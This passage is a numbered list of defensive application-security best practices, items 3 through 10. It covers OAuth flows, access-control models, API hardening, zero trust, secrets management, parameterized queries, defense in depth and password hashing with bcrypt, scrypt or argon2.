3. **OAuth 2.0 authorization code flow** for user-facing apps, **client credentials** for machine-to-machine
4. **RBAC for simple apps**, ABAC or policy-based for complex permission models
5. **Rate limit, validate input, configure CORS** — API security is non-negotiable
6. **Zero Trust: never trust, always verify** — even inside your own network
7. **Never hardcode secrets** — use environment variables at minimum, a secrets vault in production
8. **Parameterized queries prevent SQL injection** — never concatenate user input into queries
9. **Defense in depth** — layer multiple security controls, assume any single one can fail
10. **Hash passwords with bcrypt/scrypt/argon2** — never use MD5 or SHA for passwords. These algorithms are slow on purpose to resist brute-force attacks
